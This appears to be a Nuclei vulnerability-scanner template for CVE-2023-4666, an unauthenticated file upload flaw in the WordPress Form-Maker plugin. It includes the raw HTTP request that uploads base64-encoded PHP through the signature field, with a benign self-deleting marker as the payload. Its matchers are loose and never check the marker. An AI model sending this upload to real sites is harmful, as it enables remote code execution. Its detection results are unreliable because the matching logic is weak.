id: CVE-2023-4666

info:
  name: WordPress Form-Maker < 1.15.20 - Unauthenticated Arbitrary File Upload
  author: intelligent-ears
  severity: critical
  description: |
    The Form-Maker plugin for WordPress before version 1.15.20 does not validate signatures when creating them on the server from user input,
    allowing unauthenticated users to upload arbitrary files leading to Remote Code Execution (RCE).
    An attacker can inject a malicious PHP file via the signature field by using a data URI with base64-encoded PHP code.
    The uploaded file is created at /wp-content/uploads/form-maker/signatures/signature-<random>.php where the random part is a 10-digit number generated with rand().
  reference:
    - https://wpscan.com/vulnerability/c6597e36-02d6-46b4-89db-52c160f418be
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4666
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4666
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 4
    vendor: 10web
    product: form-maker
    framework: wordpress
    publicDisclosure: 2023-09-19
  tags: cve,cve2023,wordpress,wp-plugin,fileupload,rce,form-maker,unauth

variables:
  form_id: "{{rand_int(1, 10)}}"
  random_num: "{{rand_int(1000000000, 9999999999)}}"

http:
  - raw:
      - |
        GET /wp-content/plugins/form-maker/readme.txt HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /wp-content/uploads/form-maker/signatures/ HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=formmakersubmit&form_id={{form_id}}&signature-file-wdform_0=data:image/php;base64,PD9waHAgZWNobyBtZDUoJ251Y2xlaV90ZXN0Jyk7IHVubGluayhfX0ZJTEVfXyk7ID8+&field0_0=nuclei_test

      - |
        GET /wp-content/uploads/form-maker/signatures/ HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    req-condition: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: vulnerable-version
        dsl:
          - 'contains(body_1, "Form Maker")'
          - 'contains(body_1, "Stable tag:")'
          - 'regex("Stable tag: (0\\.|1\\.(0|1[0-4]|15\\.([0-9]|1[0-9])))", body_1)'
        condition: and

      - type: dsl
        name: signatures-directory-exists
        dsl:
          - 'status_code_2 == 200 || status_code_2 == 403'
          - 'contains(body_1, "Form Maker")'
        condition: and

      - type: dsl
        name: php-files-detected
        dsl:
          - 'status_code_2 == 200 || status_code_4 == 200'
          - 'contains(body_2, "signature-") && contains(body_2, ".php")'
        condition: and

      - type: dsl
        name: upload-attempted
        dsl:
          - 'contains(body_1, "Form Maker")'
          - '!contains(body_3, "404")'
          - 'status_code_3 != 404'
        condition: and

    extractors:
      - type: regex
        name: version
        part: body_1
        group: 1
        regex:
          - 'Stable tag: ([0-9.]+)'

      - type: regex
        name: uploaded-files
        part: body
        regex:
          - 'signature-[0-9]{10}\.(php|png)'
